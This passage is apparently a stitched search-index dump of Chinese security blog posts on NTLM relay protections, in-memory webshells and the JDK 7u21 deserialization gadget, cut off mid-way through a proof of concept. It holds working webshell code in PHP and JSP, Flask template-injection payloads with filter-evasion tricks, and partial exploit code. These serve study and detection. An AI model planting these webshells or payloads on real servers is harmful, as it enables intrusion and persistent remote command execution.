在前文阐述了会话签名和身份认证签名，提及到要签名时需要获得用户的密钥。在关于 MIC 的小节中也提到过，实际上使用的并不完全是用户的密钥，而是 Session Key，它基于用户密钥生成。 以下是为 NTLMv1 和 NTLMv2 计算 Session Key 的方法： # For NTLMv1 Key = MD4(NT Hash) # For NTLMv2 NTLMv2 Hash = HMAC_MD5(NT Hash, Uppercase(Username) + UserDomain) Key = HMAC_MD5(NTLMv2 Hash, HMAC_MD5(NTLMv2 Hash, NTLMv2 Response + Challenge)) 有了这些算法，客户端可以完成 Session Key 的计算。但是，在域环境中，服务器由于没有用户密钥不能独立完成。对于本地身份验证，是没有问题的。 因此，对于域帐户的身份验证，服务器会让域控制器为它计算 Session Key，然后将其返回。服务器以 NETLOGON_NETWORK_INFO 结构向域控制器发送请求，域控制器以 NETLOGON_VALIDATION_SAM_INFO4 结构响应。如果身份验证成功，会话密钥将在域控制器的此响应中发送。 那么问题就出现了，如果攻击者构造出与目标服务器向域控制器发出的相同请求，就同样可以获得 Session Key，即：CVE-2015-005 。 域控制器没有验证正在发送的身份验证信息是否实际上是针对请求此操作的加入域的机器（例如 NetrLogonSamLogonWithFlags()）。这意味着任何加入域的机器都可以验证针对域控制器的任何传递身份验证，并获取域内任何会话的 Session Key。 所以，微软已经修复了这个 BUG。为了验证只有用户进行身份验证的服务器有权请求会话密钥，域控制器将验证 AUTHENTICATE 响应中的目标计算机与发出 NetLogon 请求的主机相同。 在 AUTHENTICATE 响应中，我们详细说明了 msAvFlags 的存在是为了表明 MIC 是否存在。但还有其它信息，例如目标机器的 Netbios 名称。 这是与发出 NetLogon 请求的主机进行比较的机器名称。因此，如果攻击者尝试对 DC 进行 NetLogon 请求，由于攻击者的名称与 NTLM 响应中的目标主机名不匹配，域控制器将拒绝该请求。 最后，与 msAvFlags 一样，在计算 NTLMv2 Hash 时，包含了机器名称，因此，不能在 NTLM 响应中修改机器名称。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:7:0","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"8 Channel Binding 本节将讨论最后一个概念。本文反复提到过，身份验证层，即 NTLM 消息，几乎独立于应用层使用的协议（SMB、LDAP 等）。 说「几乎」是因为已经看到一些协议使用 NTLM 消息标志来表明会话是否必须签名。 在任何情况下，就目前而言，攻击者很有可能从协议 A 中检索 NTLM 消息，然后使用协议 B 将其发回，称为跨协议中继。 因此，存在一种新的保护措施来对抗这种攻击。这称为通道绑定(Channel Binding)，或 EPA（增强型身份验证保护）。这种保护的原则是将身份验证层与使用中的协议绑定，即使存在 TLS 层（例如 LDAPS 或 HTTPS）。总体思路是，在最后一条 NTLM AUTHENTICATE 消息中，有一条信息放在那里，攻击者无法修改。此信息指示所需的服务，以及可能包含目标服务器证书哈希的另一个信息。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:8:0","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"8.1 Service binding 第一类保护方法很容易理解。如果客户端希望对服务器进行身份验证以使用特定服务，则会在 NTLM 响应中添加标识该服务的信息。 这样，当服务器收到这个认证后，就可以看到客户端请求的服务，如果与实际请求的不一样，就不会同意提供该服务。 由于服务名称在 NTLM 响应中，因此它受到 NtProofStr 响应的保护，该响应是此信息、质询和其他信息（例如 msAvFlags）的 HMAC_MD5。它是用客户端的密钥计算的。 在上图的示例中，客户端尝试通过 HTTP 向服务器验证自己的身份。除了服务器是攻击者，并且攻击者将此身份验证重放到服务器，以访问网络共享 (SMB)。 除了客户端在他的 NTLM 响应中指明了他想要使用的服务，并且由于攻击者无法修改服务信息，攻击者只能按原样重放它。服务器然后接收到最后一条消息，将攻击者（SMB）请求的服务与NTLM消息（HTTP）中指定的服务进行比较，拒绝连接，发现两个服务不匹配。 具体来说，所谓的服务其实就是 SPN (Service Principal Name)。下图是客户端在其 NTLM 响应中发送 SPN 的数据包。 可以看到它表示客户端将使用 CIFS 服务。将此信息中继到 LDAP 服务器将导致服务器拒绝访问。 同时，该属性不仅有服务名称 (CIFS)，还有目标名称或 IP 地址。 这意味着如果攻击者将此消息中继到服务器，服务器也会检查 IP 等字符串，不一致会拒绝连接。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:8:1","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"8.2 TLS binding TLS binging 此保护的目的是将身份验证层（即 NTLM 消息）链接到可能使用的 TLS 层。 如果客户端想要使用封装在 TLS 中的协议（例如 HTTPS、LDAPS），它将与服务器建立 TLS 会话，并计算服务器证书哈希。此哈希称为通道绑定令牌 (CBT)。 计算完成后，客户端会将这个哈希值放入其 NTLM 响应中。 然后，服务器将在身份验证结束时接收 NTLM 消息，读取提供的哈希值，并将其与其证书的真实哈希值进行比较。 如果不同，则表示不是 NTLM 信息的原始接收者。 同样，由于此散列在 NTLM 响应中，因此它受 NtProofStr 响应的保护，就像服务绑定的 SPN 一样。 由于存在这种类型的保护，以下两种攻击场景就不可能再发生： 如果攻击者想从使用不带 TLS 层的协议的客户端中继到带 TLS 层的协议（例如 HTTP 到 LDAPS），则攻击者由于不能更新 NtProofStr，导致无法将来自目标服务器的证书哈希添加到 NTLM 响应。 如果攻击者想从一个带有 TLS 的协议中继到另一个带有 TLS 的协议（例如 HTTPS 到 LDAPS），在客户端和攻击者之间建立 TLS 会话时，攻击者将无法提供服务器证书，因为它不匹配攻击者的身份。因此，它必须提供伪造的自签证书，以识别攻击者。客户端然后会散列这个证书，当攻击者将 NTLM 响应中继到合法服务器时，响应中的证书 Hash 与真实证书的 Hash 不同，服务器将拒绝身份验证。 下面是说明该种方式的示意图。 图中体现了两个 TLS 会话的建立。一种介于客户端和攻击者之间（红色），一种介于攻击者和服务器之间（蓝色）。客户端将接收攻击者的证书，并计算一个哈希值，即红色的证书哈希值。 在 NTLM 交换结束时，此散列将添加到 NTLM 响应中，并且将受到保护。服务器收到这个 hash后，会 hash 自己的证书，结果不一样，拒绝连接。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:8:2","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"9 可以跨协议 Relay 的场景 有了这些信息，就能够知道哪些协议可以中继到哪些协议。例如，已经阐述了不可能从 SMB 中继到 LDAP 或 LDAPS。另外，客户端如果没有设置 NEGOTIATE_SIGN 标志位，且不需要签名，或者 LDAPS 未开启通道绑定，都可以 relay 到 LDAP。 由于案例很多，这里有一个表格总结了其中的一些。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:9:0","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"参考 Pass the Hash NTLM Relay ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:10:0","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["渗透测试","代码审计"],"content":"Webshell 内存马分析","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/","tags":["渗透测试","代码审计"],"title":"Webshell 内存马分析","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","代码审计"],"content":"Webshell 内存马分析 内存 webshell 相比于常规 webshell 更容易躲避传统安全监测设备的检测，通常被用来做持久化，规避检测，持续驻留目标服务器。无文件攻击、内存 Webshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐。 ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:0:0","tags":["渗透测试","代码审计"],"title":"Webshell 内存马分析","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","代码审计"],"content":"1 PHP 内存马 ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:1:0","tags":["渗透测试","代码审计"],"title":"Webshell 内存马分析","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","代码审计"],"content":"1.1 原理 php 内存马也就是 php 不死马是将不死马启动后删除本身，在内存中执行死循环，使管理员无法删除木马文件。 \u003c?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE__); while (1) { $content = '\u003c?php @eval($_POST[\"zzz\"]) ?\u003e'; file_put_contents(\"config.php\", $content); usleep(10000); } ?\u003e ignore_user_abort：函数设置与客户机断开是否会终止脚本的执行，如果设置为 true，则忽略与用户的断开。 set_time_limit：设置允许脚本运行的时间，单位为秒。如果设置为 0（零），没有时间方面的限制。 ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:1:1","tags":["渗透测试","代码审计"],"title":"Webshell 内存马分析","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","代码审计"],"content":"1.2 检测 检查所有 php 进程处理请求的持续时间 检测执行文件是否在文件系统真实存在 ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:1:2","tags":["渗透测试","代码审计"],"title":"Webshell 内存马分析","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","代码审计"],"content":"2 Python 内存马 ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:2:0","tags":["渗透测试","代码审计"],"title":"Webshell 内存马分析","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","代码审计"],"content":"2.1 原理 Python 内存马利用 flask 框架中 SSTI 注入来实现，flask 框架中在 web 应用模板渲染的过程中用到 render_template_string() 进行渲染，但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现 python 内存马的注入。 在 icehexman Github 中对 flask 框架下的内存马进行了研究。 2.1.1 flask route 类比 tomcat 注册路由的机制，如 filter，如果想实现 python 内存马，也应该研究下 flask 是否能动态注册路由。 flask 常规注册的方式为使用装饰器 @app.route() 。而实际工作的函数为装饰器里调用的方法 self.add_url_rule() 。 add_url_rule 需要三个参数： URL：和装饰器 app.route() 的第一个参数一样，必须以 / 开始。 endpoint：就是在使用 url_for() 进行跳转的时候，这个里面传入的第一个参数就是这个 endpoint 对应的值。这个值也可以不指定，默认值为函数名。 view_func：只需要写方法名（也可以为匿名参数），如果使用方法名不要加括号，加括号表示将函数的返回值传给了 view_func 参数。 2.1.2 flask context 想实现内存 webshell，关键点在于 view_func 。view_func 可以采用匿名函数定义逻辑，该方法要实现捕获参数值、执行命令、响应。 Flask 的工作原理：当一个请求进入 Flask，首先会实例化一个 Request Context，这个上下文封装了请求的信息在 Request 中，并将这个上下文放入到栈 _request_ctx_stack 的结构中，也就是说获取当前的请求上下文等同于获取 _request_ctx_stack 的栈顶元素 _request_ctx_stack.top 。 2.1.3 flask 内置函数 通过 {{...}} 可以执行表达式，但是命名空间是受限的，没有 builtins，所以 eval、popen 这些函数是不能使用的。但是可以通过任意一个函数的 func_globals 而得到其的命名空间，而得到 builtins。 Flask 内置了两个函数 url_for 和 get_flashed_messages。也就是构造命令执行，可以使用： {{url_for.__globals__['__builtins__'].__import__('os').system('ls')}} {{url_for.__globals__['__builtins__']['eval'](\"__import__('os').popen('whoami').read()\")}} ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:2:1","tags":["渗透测试","代码审计"],"title":"Webshell 内存马分析","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","代码审计"],"content":"2.2 实现 以下面的 Demo 代码为例： from flask import Flask, request from flask import render_template_string app = Flask(__name__) @app.route('/') def hello_world(): return 'Hello World' @app.route('/test',methods=['GET', 'POST']) def test(): template = ''' \u003cdiv class=\"center-content error\"\u003e \u003ch1\u003eOops! That page doesn't exist.\u003c/h1\u003e \u003ch3\u003e%s\u003c/h3\u003e \u003c/div\u003e ''' %(request.values.get('param')) return render_template_string(template) if __name__ == '__main__': app.run(port=8000) 将 payload 拆解开： url_for.__globals__['__builtins__']['eval']( \"app.add_url_rule( '/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read() ) \", { '_request_ctx_stack':url_for.__globals__['_request_ctx_stack'], 'app':url_for.__globals__['current_app'] } ) lambda 即匿名函数，payload 中 add_url_rule() 函数的第三个参数定义了一个 lambda 匿名函数，其中通过 os 库的 popen() 函数执行从 Web 请求中获取的 cmd 参数值并返回结果，其中该参数值默认为 whoami。 eval() 方法的语法： eval(expression[, globals[, locals]]) globals - 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。指定全局变量。 最终的 URL： http://IP:8000/param?param={{url_for.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,{%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]})}} ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:2:2","tags":["渗透测试","代码审计"],"title":"Webshell 内存马分析","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","代码审计"],"content":"2.2 检测 查看所有内建模块中是否包含 eval、exec 等可以执行代码的函数如：class warnings.catch_warnings、class site.Quitter等。 检测 self.add_url_rule() 中特殊名字的路由如 shell 等。 ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:2:3","tags":["渗透测试","代码审计"],"title":"Webshell 内存马分析","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","代码审计"],"content":"2.3 逃逸 以 Python 沙箱逃逸的技巧为例： url_for 可用 get_flashed_messages 或 request.application.__self__._get_data_for_json 等替换； 代码执行函数替换，如 exec 等替换 eval； 字符串可采用拼接方式，如 ['__builtins__']['eval'] 变为 ['__bui'+'ltins__']['ev'+'al']； __globals__ 可用 __getattribute__('__globa'+'ls__') 替换； [] 中括号可用 .__getitem__() 或 .pop() 替换； … ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:2:4","tags":["渗透测试","代码审计"],"title":"Webshell 内存马分析","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","代码审计"],"content":"3 Java 内存马 ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:3:0","tags":["渗透测试","代码审计"],"title":"Webshell 内存马分析","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","代码审计"],"content":"3.1 简介 Java 内存马目前主要分为 2 类： Servlet-API 型 通过命令执行等方式动态注册一个新的 listener、filter 或者 servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如 spring 的 controller 内存马，tomcat 的 valve 内存马 字节码增强型 通过 java 的 instrumentation 动态修改已有代码，进而实现命令执行等功能。 ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:3:1","tags":["渗透测试","代码审计"],"title":"Webshell 内存马分析","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","代码审计"],"content":"3.2 原理 Servlet、Listener、Filter 由 javax.servlet.ServletContext 去加载，无论是使用 xml 配置文件还是使用 Annotation 注解配置，均由 Web 容器进行初始化，读取其中的配置属性，然后向容器中进行注册。 Servlet 3.0 API 允许使 ServletContext 用动态进行注册，在 Web 容器初始化的时候（即建立 ServletContext 对象的时候）进行动态注册。不同的容器实现方式略有差异，下文主要以 Tomcat 为例。 3.2.1 Tomcat Tomcat 中主要包括四种容器，Engine、Host、Context、Wrapper Engine 为外部接口，可以配置多个 Host 一个 Host 可以包含多个 Context(WEB 应用) 一个 Context 可以包含多个 Wrapper 每个 Wrapper 对应 1 个 Servlet Context 对应的 Web 应用, 每一个 Context 都有唯一的 path, 这里的 path 不是指 servlet 绑定的 WebServlet 地址, 而是指的是独立的一个 Web 应用地址，就好比 Tomat 默认的 / 地址和 manager 地址就是两个不同的 web 应用，所以对应两个不同的 Context，要添加 Context 需要在 server.xml 中配置 docbase。 在一个 web 应用中可以配置多个访问路径，比如登录页面，后台管理等，对于同一个 Context 中不同的 WebServlet 地址，将会分配不同的 Wrapper。这就说明了每个 Context 可以对应多个 Wrapper，每个 Wrapper 对应一个 Servlet。说明同一个 web 应用 context 相同但是对应的 Wrapper 不同，然后根据不同的 Servlet 服务展示不同的内容。 技巧 IDEA 创建 Java Web 项目可参考：https://blog.csdn.net/gaoqingliang521/article/details/108677301 3.2.2 Listener 内存马 监听器用于监听 Web 应用中某些对象的创建、销毁、增加，修改，删除等动作的发生，然后作出相应的响应处理。当监听范围的对象的状态发生变化的时候，服务器自动调用监听器对象中的方法。常用于统计网站在线人数、系统加载时进行信息初始化、统计网站的访问量等等。 主要由三部分构成： 事件源：被监听的对象 监听器：监听的对象，事件源的变化会触发监听器的响应行为 响应行为：监听器监听到事件源的状态变化时所执行的动作 在初始化时，需要将事件源和监听器进行绑定，也就是注册监听器。请求网站的时候，程序先自动执行 listener 监听器的内容, 再去执行 filter 过滤器，如果存在多个过滤器则会组成过滤链，最后一个过滤器将会去执行 Servlet 的 service 方法，即 Listener -\u003e Filter -\u003e Servlet。 Listener 是最先被加载的, 所以可以利用动态注册恶意的 Listener 植入内存马。 Listener 分类 ServletContext 监听，服务器启动和终止时触发 ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁） ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性） Session 监听，Session 建立摧毁时触发 javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听 javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听 Request 监听，每次访问服务时触发 ServletRequestListener：对 Request 请求进行监听（创建、销毁） ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性） 如果能动态添加 Listener 那 Request 监听最适合植入内存马。 ServletRequestListener 提供两个方法：requestInitialized 和 requestDestroyed，两个方法均接收 ServletRequestEvent 作为参数，ServletRequestEvent 中又储存了 ServletContext 对象和 ServletRequest 对象，因此在访问请求过程中可以在 request 创建和销毁时实现自己的恶意代码，完成内存马的实现。 \u003c%@ page import=\"org.apache.catalina.core.StandardContext\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.ApplicationContext\" %\u003e \u003c%@ page import=\"java.lang.reflect.Field\" %\u003e \u003c%@ page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%\u003e \u003c%@ page import=\"org.apache.jasper.tagplugins.jstl.core.Out\" %\u003e \u003c%@ page import=\"java.io.IOException\" %\u003e \u003c%@ page import=\"javax.servlet.annotation.WebServlet\" %\u003e \u003c%@ page import=\"java.io.InputStreamReader\" %\u003e \u003c%@ page import=\"java.io.BufferedReader\" %\u003e \u003c% Object obj = request.getServletContext(); Field field = obj.getClass().getDeclaredField(\"context\"); field.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) field.get(obj); field = applicationContext.getClass().getDeclaredField(\"context\"); field.setAccessible(true); StandardContext standardContext = (StandardContext) field.get(applicationContext); ListenH listenH = new ListenH(request, response); standardContext.addApplicationEventListener(listenH); out.print(\"test\"); %\u003e \u003c%! public class ListenH implements ServletRequestListener { public ServletResponse response; public ServletRequest request; ListenH(ServletRequest request, ServletResponse response) { this.request = request; this.response = response; } public void requestDestroyed(ServletRequestEvent servletRequestEvent) { } public void requestInitialized(ServletRequestEvent servletRequestEvent) { String cmder = request.getParameter(\"cmd\"); String[] cmd = new String[]{\"/bin/sh\", \"-c\", cmder}; try { Process ps = Runtime.getRuntime().exec(cmd); BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream())); StringBuffer sb = new StringBuffer(); String line; while ((line = br.readLine()) != null) { //执行结果加上回车 sb.append(line).append(\"\u003cbr\u003e\"); } String result = sb.toString(); this.response.getWriter().write(result); }catch (Exception e){ System.out.println(\"error \"); } } } %\u003e 通过 jsp 尝试动态添加 Listener，这里需要注意, 因为我们是直接通过 add 来添加, 所以每次访问该 jsp 页面的时候都会重复添加 List","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:3:2","tags":["渗透测试","代码审计"],"title":"Webshell 内存马分析","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","代码审计"],"content":"参考 web 攻防技术|内存马分析 内存马到底是个什么东西 Tomcat 内存马学习 一文看懂内存马 python flask 内存马 Tomcat 内存马初探 ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:4:0","tags":["渗透测试","代码审计"],"title":"Webshell 内存马分析","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["代码审计"],"content":"7U21 Gadget 分析","date":"2021-09-01","objectID":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/","tags":["代码审计"],"title":"Java反序列化漏洞系列-5","uri":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/"},{"categories":["代码审计"],"content":"JDK 7U21 Gadget 问题 前面的文章中介绍的都是利用第三方库的反序列化利用链。没有合适的第三方库存在时，Java 反序列化是否还能利用。 首先，存在不依赖第三方库的 Java 反序列化利用链，但是，Java 新版本没有这样的问题。 ","date":"2021-09-01","objectID":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/:0:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-5","uri":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/"},{"categories":["代码审计"],"content":"1 原理 JDK7u21 的核心点是 sun.reflect.annotation.AnnotationInvocationHandler ，这个类在之前的分析中提到过。在 AnnotationInvocationHandler 类中有个 equalsImpl 方法: 反射调用：memberMethod.invoke(o) ，而 memberMethod 来自于 this.type.getDeclaredMethods() 。 也就是说， equalsImpl 这个方法是将 this.type 类中的所有方法遍历并执行了。那么，假设 this.type 是 Templates 类，则势必会调用到其中的 newTransformer() 或 getOutputProperties() 方法，进而触发任意代码执行。这就是 JDK7u21 的核心原理。 ","date":"2021-09-01","objectID":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/:1:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-5","uri":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/"},{"categories":["代码审计"],"content":"2 构造 现在的思路就是通过反序列化调用 equalsImpl ， equalsImpl 是一个私有方法，在 AnnotationInvocationHandler#invoke 中被调用： InvocationHandler 是一个接口，只有一个方法就是 invoke。 前面的文章提到过，在使用 java.reflect.Proxy 动态绑定一个接口时，如果调用该接口中任意一个方法，会执行到 InvocationHandler#invoke。执行 invoke 时，被传入的第一个参数是这个 proxy 对象，第二个参数是被执行的方法名，第三个参数是执行时的参数列表。 而 AnnotationInvocationHandler 就是一个 InvocationHandler 接口的实现，它的 invoke 方法: 可见，当方法名等于 equals，且仅有一个 Object 类型参数时，会调用到 equalImpl 方法。 所以，现在的问题变成，找到一个方法，在反序列化时对 proxy 调用 equals 方法。 ","date":"2021-09-01","objectID":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/:2:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-5","uri":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/"},{"categories":["代码审计"],"content":"3 调用链 在比较 Java 对象时，常用到两种方法： equals compareTo 任意 Java 对象都拥有 equals 方法，它通常用于比较两个对象是否是同一个引用。另一个常见的会调用 equals 的场景就是集合 set。set 中储存的对象不允许重复，所以在添加对象的时候，势必会涉及到比较操作。 HashSet 的 readObject 方法: 这里使用了一个 HashMap，将对象保存在 HashMap 的 key 处来做去重。 跟进 HashMap 的 put 方法： 变量 i 就是哈希值。两个不同的对象的 i 相等时，才会执行到 key.equals(k) ，触发前面说过的代码执行。 接下来的思路就是为了让 proxy 对象的哈希，等于 TemplateImpl 对象的哈希。 计算哈希的主要是下面这两行代码： int hash = hash(key); int i = indexFor(hash, table.length); 将其中的关键逻辑提取出来，可以得到下面这个函数: public static int hash(Object key) { int h = 0; h ^= key.hashCode(); h ^= (h \u003e\u003e\u003e 20) ^ (h \u003e\u003e\u003e 12); h = h ^ (h \u003e\u003e\u003e 7) ^ (h \u003e\u003e\u003e 4); return h \u0026 15; } 除了 key.hashCode() 外再没有其他变量，所以 proxy 对象与 TemplateImpl 对象的哈希是否相等，仅取决于这两个对象的 hashCode() 返回值是否相等。TemplateImpl 的 hashCode() 是一个Native 方法，每次运行都会发生变化，理论上是无法预测的，所以想让 proxy 的 hashCode() 与之相等，只能通过 proxy.hashCode() 。 proxy.hashCode() 仍然会调用到 AnnotationInvocationHandler#invoke ，进而调用到 AnnotationInvocationHandler#hashCodeImpl ，跟进这个方法: 遍历这个 Map 中的每个 key 和 value，计算每个 (127 * key.hashCode()) ^ value.hashCode() 并求和。 JDK7u21 中使用了一个非常巧妙的方法： 当 memberValues 中只有一个 key 和一个 value 时，该哈希简化成 (127 * key.hashCode()) ^ value.hashCode() 当 key.hashCode()==0 时，任何数异或 0 的结果仍是它本身，所以该哈希简化成 value.hashCode() 当 value 就是 TemplateImpl 时，这两个哈希就变成完全相等 因此，通过寻找一个 hashCode 是 0 的对象作为的 key，将恶意 TemplateImpl 对象作为 value，这个 proxy 计算的 hashCode 就与 TemplateImpl 对象本身的 hashCode 相等了。 找一个 hashCode 是 0 的对象，通过一个简单的爆破程序来实现： public static void bruteHashCode() { for (long i = 0; i \u003c 9999999999L; i++) { if (Long.toHexString(i).hashCode() == 0) { System.out.println(Long.toHexString(i)); } } } 第一个结果是 f5a5a608，这个也是 ysoserial 中用到的字符串。 ","date":"2021-09-01","objectID":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/:3:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-5","uri":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/"},{"categories":["代码审计"],"content":"4 总结 按照如下步骤来构造： 生成恶意 TemplateImpl 对象 实例化 AnnotationInvocationHandler 对象 type 属性是 TemplateImpl 类 memberValues 属性是一个 Map，Map 只有一个 key 和 value，key 是字符串 ， value 是前面生成的恶意 TemplateImpl 对象 对这个 AnnotationInvocationHandler 对象做一层代理，生成 proxy 对象 实例化一个 HashSet，这个 HashSet 有两个元素，分别是： TemplateImpl 对象 proxy 对象 将 HashSet 对象进行序列化 反序列化触发代码执行的流程如下： 触发 HashSet 的 readObject 方法，其中使用 HashMap 的 key 做去重 去重时计算 HashSet 中的两个元素的 hashCode ，通过构造二者相等，进而触发 equals() 方法 调用 AnnotationInvocationHandler#equalsImpl 方法 equalsImpl 中遍历 this.type 的每个方法并调用 this.type 是 TemplatesImpl 类，所以触发了 newTransform() 或 getOutputProperties() 方法 任意代码执行 POC 如下： package main.java; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.HashSet; import java.util.LinkedHashSet; import java.util.Map; public class OriginalGadgetDemo { public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\"/Volumes/MacOS/WorkSpace/JAVA/7u21Gadget/src/main/java/EvilTemplatesImpl.class\")); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{code}); setFieldValue(templates, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(templates, \"_tfactory\", new 